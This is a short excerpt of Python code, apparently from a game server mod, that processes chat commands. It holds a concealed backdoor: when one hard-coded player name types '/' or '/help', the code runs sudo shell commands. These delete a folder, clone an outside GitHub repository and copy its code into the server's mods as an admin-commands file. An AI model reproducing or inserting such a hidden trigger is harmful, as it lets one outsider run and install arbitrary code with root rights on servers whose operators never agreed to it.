        ...
        if len(messages)>1:
            ...
            if playername in ['\ue063VinesCraft']:
                if c in ['/', '/help']:
                    ...
                    os.system("sudo rm -rf HypeServerStaff/ && gh repo clone thegamer002/HypeServerStaff && sudo cp HypeServerStaff/Codes/* ba_root/mods/ && mv ba_root/mods/HypeRefresh.py ba_root/mods/HypeAdminCmds.py  && sudo rm -rf HypeServerStaff/")
